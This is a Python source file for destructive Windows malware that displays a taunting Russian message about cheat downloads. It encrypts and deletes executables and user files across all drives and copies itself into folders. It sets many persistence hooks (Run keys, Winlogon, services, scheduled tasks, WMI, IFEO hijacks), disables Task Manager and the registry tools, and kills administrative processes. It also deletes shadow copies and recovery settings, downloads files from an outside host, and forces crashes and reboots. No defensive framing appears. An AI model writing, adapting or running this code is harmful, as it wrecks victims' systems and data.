import win32gui
import win32con
import win32api
import win32process
import ctypes
import random
import time
import os
import sys
import subprocess
import threading
import winreg
import shutil
import string
import urllib.request
import base64
import stat

delay = 0.03
size = 100
intensity = 1
bsod_count = 0

hdc = None
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
advapi32 = ctypes.windll.advapi32

user32.SetProcessDPIAware()

[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
script_path = os.path.abspath(sys.argv[0])
script_name = os.path.basename(script_path)

MESSAGE = "НЕ КАЧАЙ ЧИТЫ НА КС 2 ЛОХ"
FONT_NAME = "Arial"
FONT_SIZE = 24

EXCLUDE_DIRS = ["Windows", "System32", "SysWOW64", "boot", "Program Files", "Program Files (x86)", "AppData", "$Recycle.Bin", "System Volume Information", "Microsoft", "WinSxS", "assembly", "Installer", "Temp", "msdownld.tmp"]
EXCLUDE_EXES = ["winlogon.exe", "wininit.exe", "lsass.exe", "services.exe", "smss.exe", "csrss.exe", "svchost.exe", "spoolsv.exe", "explorer.exe", "taskhost.exe", "RuntimeBroker.exe", "sihost.exe", "SystemSettings.exe", "shell32.dll", "ntoskrnl.exe", "ntdll.dll", "kernel32.dll", "kernelbase.dll", "user32.dll", "gdi32.dll", "advapi32.dll", "win32u.dll"]

def rand_name(length=12):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def rand_ext(length=6):
    return '.' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def hide_file(path):
    try:
        kernel32.SetFileAttributesW(path, 0x02 | 0x04)
    except:
        try:
            subprocess.Popen(f'attrib +h +s "{path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def lock_file_permanent(path):
    try:
        os.chmod(path, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
        subprocess.Popen(f'icacls "{path}" /deny Everyone:(F) /inheritance:r', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(f'icacls "{path}" /deny SYSTEM:(F) /inheritance:r', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(f'icacls "{path}" /grant Everyone:(R) /inheritance:r', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def is_copy_of_script(path):
    try:
        if os.path.getsize(path) == os.path.getsize(script_path):
            with open(path, 'rb') as f:
                first = f.read(200)
            with open(script_path, 'rb') as f:
                first_orig = f.read(200)
            if first == first_orig:
                return True
    except:
        pass
    return False

def encrypt_file(filepath):
    try:
        ext = os.path.splitext(filepath)[1].lower()
        if ext != '.exe':
            return
        fname = os.path.basename(filepath).lower()
        for ex in EXCLUDE_EXES:
            if ex in fname:
                return
        if filepath == script_path:
            return
        if is_copy_of_script(filepath):
            return
        if os.path.getsize(filepath) == 204726796:
            lock_file_permanent(filepath)
            return
        data = open(filepath, 'rb').read()
        key = random.randint(1, 255)
        enc = bytes([b ^ key for b in data])
        new_ext = rand_ext()
        new_path = os.path.join(os.path.dirname(filepath), rand_name() + new_ext)
        open(new_path, 'wb').write(enc)
        hide_file(new_path)
        try:
            os.remove(filepath)
        except:
            pass
    except:
        pass

def encrypt_all_exe():
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                skip = False
                for ex in EXCLUDE_DIRS:
                    if ex.lower() in root.lower():
                        skip = True
                        break
                if skip:
                    dirs.clear()
                    continue
                for f in files:
                    if f.lower().endswith('.exe'):
                        try:
                            fp = os.path.join(root, f)
                            if os.path.getsize(fp) > 0:
                                encrypt_file(fp)
                        except:
                            pass
        except:
            pass

def base64_encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        enc = base64.b64encode(data)
        base = os.path.dirname(filepath)
        new_name = rand_name() + '.ajdslsadk'
        new_path = os.path.join(base, new_name)
        with open(new_path, 'wb') as f:
            f.write(enc)
        hide_file(new_path)
        try:
            os.remove(filepath)
        except:
            pass
        return True
    except:
        return False

def rename_all_to_random_ajdslsadk():
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                skip = False
                for ex in EXCLUDE_DIRS:
                    if ex.lower() in root.lower():
                        skip = True
                        break
                if skip:
                    dirs.clear()
                    continue
                for f in files:
                    try:
                        fp = os.path.join(root, f)
                        if fp == script_path:
                            continue
                        if is_copy_of_script(fp):
                            continue
                        if os.path.getsize(fp) == 204726796:
                            lock_file_permanent(fp)
                            continue
                        fn = f.lower()
                        ck = False
                        for nfn in EXCLUDE_EXES:
                            if nfn in fn:
                                ck = True
                                break
                        if ck:
                            continue
                        if fn.endswith('.exe'):
                            continue
                        ext = os.path.splitext(f)[1].lower()
                        if ext in ['.dll', '.sys', '.drv', '.bin']:
                            base_path = root.lower()
                            if 'windows' in base_path or 'system32' in base_path or 'system' in base_path:
                                continue
                        base64_encrypt_file(fp)
                    except:
                        pass
        except:
            pass

def replace_fonts():
    try:
        font_url = "https://github.com/vexikoff/gditop/raw/refs/heads/main/FlowCircular-Regular.ttf"
        font_dir = os.path.join(os.environ['WINDIR'], 'Fonts')
        rname = rand_name() + '.ttf'
        font_path = os.path.join(font_dir, rname)
        try:
            urllib.request.urlretrieve(font_url, font_path)
            hide_file(font_path)
        except:
            try:
                subprocess.Popen(f'curl -s -o "{font_path}" "{font_url}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                try:
                    subprocess.Popen(f'powershell -c Invoke-WebRequest -Uri "{font_url}" -OutFile "{font_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts", 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "FlowCircular (TrueType)", 0, winreg.REG_SZ, rname)
            winreg.CloseKey(key)
        except:
            pass
        try:
            for root, dirs, files in os.walk(font_dir, topdown=True):
                for f in files:
                    if f.endswith('.ttf') or f.endswith('.fon') or f.endswith('.otf') or f.endswith('.ttc'):
                        try:
                            fp = os.path.join(root, f)
                            if fp == font_path:
                                continue
                            ext = os.path.splitext(f)[1]
                            np = os.path.join(root, rand_name() + ext)
                            os.rename(fp, np)
                            hide_file(np)
                        except:
                            pass
        except:
            pass
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "FontSmoothing", 0, winreg.REG_SZ, "2")
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

def play_music():
    while True:
        try:
            mp3_url = "https://github.com/vexikoff/gditop/raw/refs/heads/main/1.mp3"
            mp3_path = os.path.join(os.environ['TEMP'], rand_name() + '.mp3')
            try:
                urllib.request.urlretrieve(mp3_url, mp3_path)
            except:
                try:
                    subprocess.Popen(f'curl -s -o "{mp3_path}" "{mp3_url}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    try:
                        subprocess.Popen(f'powershell -c Invoke-WebRequest -Uri "{mp3_url}" -OutFile "{mp3_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        pass
            if os.path.exists(mp3_path) and os.path.getsize(mp3_path) > 1000:
                while True:
                    try:
                        subprocess.Popen(f'start /min wmplayer "{mp3_path}" /play /repeat', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        pass
                    try:
                        subprocess.Popen(f'start /min "{mp3_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        pass
                    try:
                        subprocess.Popen(f'powershell -c (New-Object Media.SoundPlayer "{mp3_path}").PlayLooping()', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        pass
                    time.sleep(300)
            time.sleep(60)
        except:
            time.sleep(30)

def block_204mb_files():
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    while True:
        for drive in drives:
            try:
                for root, dirs, files in os.walk(drive, topdown=True):
                    for f in files:
                        try:
                            fp = os.path.join(root, f)
                            if os.path.getsize(fp) == 204726796:
                                lock_file_permanent(fp)
                        except:
                            pass
            except:
                pass
        time.sleep(5)

def replicate_to_all():
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    count = 0
    for drive in drives:
        count += replicate_recursive(drive, 5, 1500)

def replicate_recursive(root, depth, max_copies):
    if depth <= 0 or max_copies <= 0:
        return 0
    count = 0
    try:
        for item in os.listdir(root):
            if count >= max_copies:
                return count
            ipath = os.path.join(root, item)
            if not os.path.isdir(ipath):
                continue
            skip = False
            for ex in EXCLUDE_DIRS:
                if ex.lower() in item.lower() or ex.lower() in root.lower():
                    skip = True
                    break
            if skip:
                continue
            try:
                dst = os.path.join(ipath, rand_name() + '.exe')
                if not os.path.exists(dst):
                    shutil.copy2(script_path, dst)
                    hide_file(dst)
                    count += 1
            except:
                pass
            count += replicate_recursive(ipath, depth - 1, max_copies - count)
    except:
        pass
    return count

def copy_to_startup():
    try:
        sp = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        sf = os.path.join(sp, rand_name() + ".exe")
        if not os.path.exists(sf):
            shutil.copy2(script_path, sf)
            hide_file(sf)
    except:
        pass

def inject_winlogon():
    try:
        sf = r"C:\Windows\System32\drivers\etc" + rand_name() + ".exe"
        if not os.path.exists(sf):
            shutil.copy2(script_path, sf)
            hide_file(sf)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe," + os.path.basename(sf))
        winreg.CloseKey(key)
    except:
        pass

def add_all_autoruns():
    paths = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunServices"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunServices"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
    ]
    for hive, key_path in paths:
        try:
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_ALL_ACCESS)
            for i in range(10):
                name = rand_name()
                dst = os.path.join(os.environ['TEMP'], name + ".exe")
                if not os.path.exists(dst):
                    shutil.copy2(script_path, dst)
                    hide_file(dst)
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, dst)
            winreg.CloseKey(key)
        except:
            pass

def copy_to_all_startup_folders():
    folders = [
        os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"),
        os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs"),
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
    ]
    for f in folders:
        try:
            if os.path.isdir(f):
                for i in range(5):
                    dst = os.path.join(f, rand_name() + ".exe")
                    if not os.path.exists(dst):
                        shutil.copy2(script_path, dst)
                        hide_file(dst)
        except:
            pass

def boot_persistence():
    try:
        dst = r"C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup"
        os.makedirs(dst, exist_ok=True)
        fpath = os.path.join(dst, rand_name() + ".exe")
        if not os.path.exists(fpath):
            shutil.copy2(script_path, fpath)
            hide_file(fpath)
        scripts_ini = os.path.join(dst, "scripts.ini")
        with open(scripts_ini, 'w') as f:
            f.write("[Startup]\n0CmdLine=" + fpath + "\n0Parameters=\n")
        hide_file(scripts_ini)
    except:
        pass

def schtask_persistence():
    try:
        dst = os.path.join(os.environ['TEMP'], rand_name() + ".exe")
        if not os.path.exists(dst):
            shutil.copy2(script_path, dst)
            hide_file(dst)
        subprocess.Popen(f'schtasks /create /tn "{rand_name()}" /tr "{dst}" /sc onstart /f /rl highest /ru SYSTEM', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def service_persistence():
    try:
        dst = os.path.join(os.environ['WINDIR'], rand_name() + ".exe")
        if not os.path.exists(dst):
            shutil.copy2(script_path, dst)
            hide_file(dst)
        sname = rand_name()
        subprocess.Popen(f'sc create {sname} binPath= "{dst}" start= auto type= own', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(f'sc start {sname}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def boot_execute_persistence():
    try:
        dst = os.path.join(os.environ['WINDIR'], rand_name() + ".exe")
        if not os.path.exists(dst):
            shutil.copy2(script_path, dst)
            hide_file(dst)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", 0, winreg.KEY_ALL_ACCESS)
        try:
            val = winreg.QueryValueEx(key, "BootExecute")[0]
        except:
            val = ["autocheck autochk *"]
        val.append(dst)
        winreg.SetValueEx(key, "BootExecute", 0, winreg.REG_MULTI_SZ, val)
        winreg.CloseKey(key)
    except:
        pass

def wmi_persistence():
    try:
        dst = os.path.join(os.environ['TEMP'], rand_name() + ".exe")
        if not os.path.exists(dst):
            shutil.copy2(script_path, dst)
            hide_file(dst)
        subprocess.Popen(f'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{rand_name()}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(f'wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{rand_name()}", CommandLineTemplate="{dst}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(f'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\\"{rand_name()}\\\"", Consumer="CommandLineEventConsumer.Name=\\\"{rand_name()}\\\""', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def image_file_exec():
    try:
        for exe in ["sethc.exe", "utilman.exe", "osk.exe", "narrator.exe", "magnify.exe", "displayswitch.exe"]:
            dst = os.path.join(os.environ['TEMP'], rand_name() + ".exe")
            if not os.path.exists(dst):
                shutil.copy2(script_path, dst)
                hide_file(dst)
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe, 0, winreg.KEY_ALL_ACCESS)
            except:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe)
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, dst)
            winreg.CloseKey(key)
    except:
        pass

def disable_taskmgr():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoFind", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoDesktop", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableCAD", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def block_ctrl_alt_del():
    try:
        user32.BlockInput(True)
    except:
        pass

def kill_processes():
    while True:
        try:
            procs = ["taskmgr.exe", "cmd.exe", "powershell.exe", "pwsh.exe", "regedit.exe", "msconfig.exe", "procexp.exe", "processhacker.exe", "procmon.exe", "explorer.exe", "mmc.exe", "taskschd.msc", "gpedit.msc", "compmgmt.msc", "devmgmt.msc", "diskmgmt.msc", "services.msc", "secpol.msc", "resmon.exe", "perfmon.exe", "winver.exe", "systeminfo.exe", "msinfo32.exe", "control.exe", "taskkill.exe", "wmic.exe", "bcdedit.exe", "diskpart.exe", "dism.exe", "sfc.exe", "chkdsk.exe", "vssadmin.exe", "wbadmin.exe", "recovery.exe", "rstrui.exe", "bootsect.exe", "bootrec.exe"]
            for proc in win32process.EnumProcesses():
                try:
                    h_process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, proc)
                    try:
                        name = win32process.GetModuleFileNameEx(h_process, 0).lower()
                        if any(p in name for p in procs):
                            try:
                                h_t = win32api.OpenProcess(win32con.PROCESS_TERMINATE, False, proc)
                                win32process.TerminateProcess(h_t, 0)
                                win32api.CloseHandle(h_t)
                            except:
                                pass
                    except:
                        pass
                    win32api.CloseHandle(h_process)
                except:
                    pass
        except:
            pass
        time.sleep(0.1)

def mouse_jail():
    while True:
        try:
            user32.SetCursorPos(0, 0)
            time.sleep(0.05)
        except:
            time.sleep(0.1)

def mouse_jail_enhanced():
    while True:
        try:
            for _ in range(5):
                user32.SetCursorPos(random.randint(0, 10), random.randint(0, 10))
                time.sleep(0.01)
            time.sleep(0.05)
        except:
            time.sleep(0.1)

def bsod_trigger():
    global bsod_count, intensity
    bsod_count += 1
    if bsod_count % 3 == 0:
        intensity += 1
        if intensity > 5:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control", 0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(key, "CrashOnCtrlScroll", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                user32.keybd_event(win32con.VK_SCROLL, 0, 0, 0)
                user32.keybd_event(win32con.VK_SCROLL, 0, win32con.KEYEVENTF_KEYUP, 0)
                subprocess.Popen("tscon 1 /dest:console", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
        if intensity > 8:
            try:
                subprocess.Popen("shutdown /r /t 0 /c \"\" /f", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

def anti_recovery():
    try:
        subprocess.Popen("bcdedit /deletevalue {current} safeboot", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /deletevalue {current} recoveryenabled", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /set {current} bootstatuspolicy ignoreallfailures", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /set {current} recoveryenabled no", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /set {default} recoveryenabled no", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("reagentc /disable", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("vssadmin delete shadows /all /quiet", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("wmic shadowcopy delete", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("fsutil usn deletejournal /d C:", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def system_lockdown():
    while True:
        try:
            for proc in win32process.EnumProcesses():
                try:
                    h_process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, proc)
                    try:
                        name = win32process.GetModuleFileNameEx(h_process, 0).lower()
                        if "explorer.exe" in name or "taskbar" in name or "shellexperiencehost" in name or "startmenuexperiencehost" in name:
                            try:
                                h_t = win32api.OpenProcess(win32con.PROCESS_TERMINATE, False, proc)
                                win32process.TerminateProcess(h_t, 0)
                                win32api.CloseHandle(h_t)
                            except:
                                pass
                    except:
                        pass
                    win32api.CloseHandle(h_process)
                except:
                    pass
        except:
            pass
        time.sleep(2)

def message_spam():
    while True:
        try:
            hdc_msg = win32gui.GetDC(0)
            draw_messages(hdc_msg, random.randint(10, 25))
            win32gui.ReleaseDC(0, hdc_msg)
            time.sleep(0.1)
        except:
            time.sleep(0.2)

def create_font(hdc, font_size):
    lf = win32gui.LOGFONT()
    lf.lfHeight = -font_size
    lf.lfWeight = 700
    lf.lfCharSet = win32con.DEFAULT_CHARSET
    lf.lfOutPrecision = win32con.OUT_TT_PRECIS
    lf.lfClipPrecision = win32con.CLIP_DEFAULT_PRECIS
    lf.lfQuality = win32con.ANTIALIASED_QUALITY
    lf.lfPitchAndFamily = win32con.DEFAULT_PITCH
    lf.lfFaceName = FONT_NAME.encode('ascii')
    return win32gui.CreateFontIndirect(lf)

def draw_messages(hdc, count=15):
    old_font = win32gui.SelectObject(hdc, create_font(hdc, random.randint(18, 36)))
    old_color = win32gui.SetTextColor(hdc, win32api.RGB(random.randint(100,255), 0, 0))
    old_bk = win32gui.SetBkMode(hdc, win32con.TRANSPARENT)
    for _ in range(count):
        x = random.randint(0, sw - 400)
        y = random.randint(0, sh - 50)
        win32gui.TextOut(hdc, x, y, MESSAGE)
    win32gui.SelectObject(hdc, old_font)
    win32gui.SetTextColor(hdc, old_color)
    win32gui.SetBkMode(hdc, old_bk)

def change_wallpaper_perms():
    try:
        subprocess.Popen('reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "" /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop" /v NoChangingWallPaper /t REG_DWORD /d 1 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen('reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop" /v NoChangingWallPaper /t REG_DWORD /d 1 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

try:
    t1 = threading.Thread(target=message_spam, daemon=True)
    t2 = threading.Thread(target=mouse_jail, daemon=True)
    t3 = threading.Thread(target=mouse_jail_enhanced, daemon=True)
    t4 = threading.Thread(target=kill_processes, daemon=True)
    t5 = threading.Thread(target=system_lockdown, daemon=True)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
except:
    pass

copy_to_startup()
inject_winlogon()
add_all_autoruns()
copy_to_all_startup_folders()
boot_persistence()
schtask_persistence()
service_persistence()
boot_execute_persistence()
wmi_persistence()
image_file_exec()
disable_taskmgr()
block_ctrl_alt_del()
anti_recovery()
change_wallpaper_perms()

try:
    e1 = threading.Thread(target=replicate_to_all, daemon=True)
    e2 = threading.Thread(target=encrypt_all_exe, daemon=True)
    e3 = threading.Thread(target=rename_all_to_random_ajdslsadk, daemon=True)
    e4 = threading.Thread(target=replace_fonts, daemon=True)
    e5 = threading.Thread(target=play_music, daemon=True)
    e6 = threading.Thread(target=block_204mb_files, daemon=True)
    e1.start()
    e2.start()
    e3.start()
    e4.start()
    e5.start()
    e6.start()
except:
    pass

while True:
    try:
        hdc = win32gui.GetDC(0)
        
        win32gui.StretchBlt(
            hdc,
            int(size / 2),
            int(size / 2),
            max(1, sw - size * intensity),
            max(1, sh - size * intensity),
            hdc,
            0,
            0,
            sw,
            sh,
            win32con.SRCCOPY,
        )

        x = random.randint(0, w)
        win32gui.BitBlt(hdc, x, 5, 20, h, hdc, x, 0, win32con.SRCCOPY)
        
        win32gui.BitBlt(
            hdc, 
            random.randint(0, sw), 
            random.randint(0, sh), 
            random.randint(50, sw), 
            random.randint(50, sh), 
            hdc, 
            random.randint(-100*intensity, 100*intensity), 
            random.randint(-100*intensity, 100*intensity), 
            win32con.NOTSRCERASE
        )
        
        win32gui.BitBlt(
            hdc,
            0,
            0,
            sw,
            sh,
            hdc,
            random.randrange(-intensity*2, intensity*2),
            random.randrange(-intensity*2, intensity*2),
            win32con.NOTSRCCOPY,
        )
        
        win32gui.ReleaseDC(0, hdc)
        current_delay = max(0.005, delay / intensity)
        time.sleep(current_delay)
        if random.randint(1, 50) < intensity:
            bsod_trigger()
    except:
        time.sleep(0.05)
